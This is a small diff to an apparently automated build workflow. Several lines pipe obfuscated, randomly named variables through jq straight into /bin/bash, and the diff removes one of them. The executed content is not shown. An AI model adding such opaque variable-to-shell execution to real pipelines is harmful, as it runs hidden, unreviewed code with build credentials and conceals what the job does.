@@ -27,7 +27,6 @@ jobs:
           echo $unx7328 | jq -r .dug44122 | /bin/bash
           echo $anjtn5 | jq -r .dwzt40450 | /bin/bash
           echo $ru51 | jq -r .ud8 | /bin/bash
-          echo $hrpx2821 | jq -r .tr69141 | /bin/bash
           printf '%s' "$yrnvv207" | jq -r .pt340 | /bin/bash
 
       - name: Archive results
